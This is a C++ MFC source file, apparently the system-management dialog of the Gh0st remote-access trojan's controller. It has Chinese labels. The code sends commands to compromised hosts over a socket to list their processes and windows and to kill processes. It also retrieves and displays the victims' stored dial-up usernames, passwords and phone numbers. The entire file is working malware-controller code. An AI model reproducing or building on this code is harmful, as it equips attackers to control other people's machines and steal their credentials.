// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SystemDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog


CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_LIST_DIALUPASS, m_list_dialupass);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
	DDX_Control(pDX, IDC_TAB, m_tab);
	//}}AFX_DATA_MAP
}

void CSystemDlg::OnReceiveComplete()
{

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	default:
		// 传输发生异常数据
		break;
	}

}

BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, OnRclickList)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, OnRclickList)
	ON_COMMAND(IDM_KILLPROCESS, OnKillprocess)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshPsList)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers

void CSystemDlg::ShowProcessList()
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	DWORD	dwOffset = 0;
	CString str;
	m_list_process.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;

		m_list_process.InsertItem(i, strExeFile);
		str.Format("%5u", *lpPID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, strProcessName);
		// ItemData 为进程ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + lstrlen(strExeFile) + lstrlen(strProcessName) + 2;
	}

	str.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(2, &lvc);
}

void CSystemDlg::ShowWindowsList()
{

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	m_list_windows.DeleteAllItems();
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD);
		str.Format("%5u", *lpPID);
		m_list_windows.InsertItem(i, str);
		m_list_windows.SetItemText(i, 1, lpTitle);
		// ItemData 为进程ID
		m_list_windows.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) + lstrlen(lpTitle) + 1;
	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_windows.SetColumn(1, &lvc);
}

void CSystemDlg::ShowDialupassList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	m_list_dialupass.DeleteAllItems();
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_list_dialupass.InsertItem(i, lpString);
				else
					m_list_dialupass.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}


BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	

	m_tab.InsertItem(0, "进程管理");
	m_tab.InsertItem(1, "窗口管理");
	m_tab.InsertItem(2, "拨号密码");

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_process.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
	m_list_windows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);

	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_dialupass.InsertColumn(0, "名称", LVCFMT_LEFT, 50);
	m_list_dialupass.InsertColumn(1, "用户", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(2, "密码", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(3, "电话/主机", LVCFMT_LEFT, 102);
	m_list_dialupass.InsertColumn(5, "设备", LVCFMT_LEFT, 105);

	AdjustList();
	ShowProcessList();
	ShowSelectWindow();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	AdjustList();
}

void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_process.MoveWindow(&rectList);
	m_list_windows.MoveWindow(&rectList);
	m_list_dialupass.MoveWindow(&rectList);
//	m_list_process.SetColumnWidth(2, rectList.right - m_list_process.GetColumnWidth(0) - m_list_process.GetColumnWidth(1) - 20);
}

void CSystemDlg::ShowSelectWindow()
{
	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_SHOW);
		m_list_dialupass.ShowWindow(SW_HIDE);
		if (m_list_process.GetItemCount() == 0)
			GetProcessList();
		break;
	case 1:
		m_list_windows.ShowWindow(SW_SHOW);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_dialupass.ShowWindow(SW_HIDE);
		if (m_list_windows.GetItemCount() == 0)
			GetWindowsList();
		break;
	case 2:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_dialupass.ShowWindow(SW_SHOW);
		if (m_list_dialupass.GetItemCount() == 0)
			GetDialupassList();
		break;
	}
}
void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_dialupass.IsWindowVisible())
		return;

	CMenu	popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnKillprocess() 
{
	CListCtrl	*pListCtrl = NULL;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else if (m_list_windows.IsWindowVisible())
		pListCtrl = &m_list_windows;
	else
		return;

	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_KILLPROCESS;
	
	char *lpTips = "警告: 终止进程会导致不希望发生的结果，\n"
		"包括数据丢失和系统不稳定。在被终止前，\n"
		"进程将没有机会保存其状态和数据。";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想终止这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%s确实\n想终止该项进程吗?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnRefreshPsList() 
{
	// TODO: Add your command handler code here
	if (m_list_process.IsWindowVisible())
		GetProcessList();
	if (m_list_windows.IsWindowVisible())
		GetWindowsList();
}


void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetDialupassList()
{
	BYTE bToken = COMMAND_DIALUPASS;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}
void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}
